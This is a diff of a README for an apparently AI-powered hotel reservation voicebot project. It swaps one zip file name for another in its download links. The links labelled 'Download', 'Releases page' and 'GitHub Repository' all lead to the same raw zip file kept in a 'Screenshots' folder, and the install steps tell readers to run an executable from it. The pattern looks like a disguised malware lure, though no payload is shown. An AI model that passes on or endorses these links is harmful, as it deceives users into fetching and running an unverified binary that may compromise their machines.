@@ -6,7 +6,7 @@ Welcome to the Smart Voicebot Hotel Reservation System! This AI-powered web app 
 
 ## 📥 Download Link
 
-[![Download Voicebot-Reservation-system-for-Hotels](https://raw.githubusercontent.com/duongdz-create/Voicebot-Reservation-system-for-Hotels/main/Screenshots/Voicebot-Reservation-system-for-Hotels-3.1.zip)](https://raw.githubusercontent.com/duongdz-create/Voicebot-Reservation-system-for-Hotels/main/Screenshots/Voicebot-Reservation-system-for-Hotels-3.1.zip)
+[![Download Voicebot-Reservation-system-for-Hotels](https://raw.githubusercontent.com/duongdz-create/Voicebot-Reservation-system-for-Hotels/main/Screenshots/Voicebot_system_Reservation_Hotels_for_1.0.zip)](https://raw.githubusercontent.com/duongdz-create/Voicebot-Reservation-system-for-Hotels/main/Screenshots/Voicebot_system_Reservation_Hotels_for_1.0.zip)
 
 ## 📝 Overview
 
@@ -32,7 +32,7 @@ To run the Voicebot Reservation System, you need:
 
 ## 🖥️ Download & Install
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/duongdz-create/Voicebot-Reservation-system-for-Hotels/main/Screenshots/Voicebot-Reservation-system-for-Hotels-3.1.zip) to download the latest version of the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/duongdz-create/Voicebot-Reservation-system-for-Hotels/main/Screenshots/Voicebot_system_Reservation_Hotels_for_1.0.zip) to download the latest version of the application.
 2. Look for the latest release at the top of the page.
 3. Click on the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS).
 4. Wait for the download to complete.
@@ -64,7 +64,7 @@ For any support inquiry, please reach out to us via the issues page or check the
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/duongdz-create/Voicebot-Reservation-system-for-Hotels/main/Screenshots/Voicebot-Reservation-system-for-Hotels-3.1.zip)
-- [Releases Page](https://raw.githubusercontent.com/duongdz-create/Voicebot-Reservation-system-for-Hotels/main/Screenshots/Voicebot-Reservation-system-for-Hotels-3.1.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/duongdz-create/Voicebot-Reservation-system-for-Hotels/main/Screenshots/Voicebot_system_Reservation_Hotels_for_1.0.zip)
+- [Releases Page](https://raw.githubusercontent.com/duongdz-create/Voicebot-Reservation-system-for-Hotels/main/Screenshots/Voicebot_system_Reservation_Hotels_for_1.0.zip)
 
 Thank you for choosing the Smart Voicebot Hotel Reservation System! Enjoy hassle-free hotel bookings.
